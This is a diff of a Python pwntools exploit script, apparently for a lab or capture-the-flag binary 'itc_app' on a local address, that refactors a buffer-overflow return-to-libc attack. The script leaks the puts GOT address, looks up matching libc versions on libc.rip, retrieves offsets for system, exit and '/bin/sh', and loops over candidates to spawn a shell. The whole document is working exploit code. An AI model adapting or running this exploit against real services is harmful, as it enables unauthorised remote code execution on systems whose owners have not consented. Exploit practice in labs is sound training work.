@@ -7,24 +7,19 @@ conn = '192.168.0.156'
 port = 9000
 
 # Output Lines Configuration
-OUTPUT_LINES_BEFORE = 6
-OUTPUT_LINES_AFTER = 2
+OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
 
 # Static Configuration
 static = "./itc_app"
 buffSize = 132
 
 # URLs and Headers for API Requests
-findLibcUrl = 'https://libc.rip/api/find'
+FIND_LIBC_URL = 'https://libc.rip/api/find'
 LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
 HEADERS = {'Content-Type': 'application/json'}
 
 # Function Offsets
-pltPuts = 0x8048340
-pltGets = 0x08048330
-mainAddr = 0x804847b
-gotPuts = 0x80497ac
-gotGets = 0x80497a8
+PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac
 
 def handle_reverse_shell(redirect_stderr=True):
     """
@@ -50,8 +45,8 @@ def leak_via_puts(conn, port,put_out_addr, msg="puts"):
     proc = remote(conn,port)
     payload = flat(
         b'A' * buffSize,
-        p32(pltPuts),
-        p32(mainAddr),
+        p32(PLT_PUTS),
+        p32(MAIN_ADDR),
         p32(put_out_addr),
     )
     
@@ -65,7 +60,7 @@ def leak_via_puts(conn, port,put_out_addr, msg="puts"):
 # Perform a return-to-libc attack executing system('/bin/sh')
 def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     # Leak randomised libc puts addr
-    puts_addr = leak_via_puts(conn, port, gotPuts)
+    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
 
     # Get lib base addr using puts_offset
     libc_address = puts_addr - puts_offset
@@ -103,58 +98,69 @@ def skip_lines(proc, lines):
         except EOFError:
             pass
 
-def find_potential_libcs(puts_addr,gets_addr):
+def find_potential_libcs(puts_addr):
     """
     Retrieves potential libc versions matching given offsets.
     """
-    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(gets_addr)}}
-    response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
+    data = {"symbols": {"puts": hex(puts_addr)}}
+    response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
     return response.json()
 
 def get_libc_symbol_offsets(libc_id):
     """
-    Retrieves offsets for various symbols from the libc database.
+    Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
     """
     libc_id = libc_id['id']
     libc_url = LIBC_SEARCH_URL + libc_id
     
-    # Define extra symbols to retrieve from the database
-    find_symbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
+    # Define symbols of interest
+    find_symbols = {"symbols": ["puts", "system", "exit", "str_bin_sh"]}
 
-    # Request symbols from the datatbase
+    # Request these symbols from the database
     response = requests.post(libc_url, headers=HEADERS, data=json.dumps(find_symbols))
     symbol_json = response.json()
 
-    # Store the symbols into variables
+    # Extract and log the offsets for the requested symbols
     puts_off = symbol_json['symbols'].get('puts')
     system_off = symbol_json['symbols'].get('system')
     exit_off = symbol_json['symbols'].get('exit')
     binsh_off = symbol_json['symbols'].get('str_bin_sh')
-    print()
-    log.info("Trying offsets for libc version: "+libc_id)
+
+    log.info(f"Trying offsets for libc version: {libc_id}")
     log.info(f"Offsets - puts: {puts_off}, system: {system_off}, str_bin_sh: {binsh_off}, exit: {exit_off}")
+
+    # Return the offsets
     return puts_off, system_off, exit_off, binsh_off
 
+
 def main():
-    puts_addr = leak_via_puts(conn,port,gotPuts)
-    gets_addr = leak_via_puts(conn,port,gotGets,msg="gets")
-    response_json = find_potential_libcs(puts_addr,gets_addr)
+    # Initial leak of the puts address to identify potential libc versions
+    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
+    potential_libcs = find_potential_libcs(puts_addr)
 
-    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
-    for item in response_json:
-        # Get the symbol offsets for the specific libc version
-        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(item)
+    # Loop through each potential libc version to attempt exploitation
+    for libc in potential_libcs:
+        # Retrieve offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'
+        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(libc)
 
-        # Attempt to execute system('/bin/sh')
-        ret_val = attempt_r2libc(int(puts_off,16),int(system_off,16),int(exit_off,16),int(binsh_off,16))
+        # Convert offsets from hexadecimal strings to integers
+        puts_off, system_off, exit_off, binsh_off = \
+            int(puts_off, 16), int(system_off, 16), int(exit_off, 16), int(binsh_off, 16)
 
-        # Print exit message depending on the return value
+        # Attempt return-to-libc attack with the current libc version's offsets
+        ret_val = attempt_r2libc(puts_off, system_off, exit_off, binsh_off)
+
+        # Handle the result of the exploitation attempt
         if ret_val == 200:
-            print("End of file recieved")
+            print("Shell interaction finished successfully.")
             break
         else:
-            log.failure("Recieved premature EOF")
+            log.failure("Exploit failed with the current libc version. Attempting next version...")
             proc.close()
+
+    else:
+        print("All potential libc versions have been attempted. Exploit may have failed.")
+        proc.close()
 
 if __name__ == "__main__":
     main()
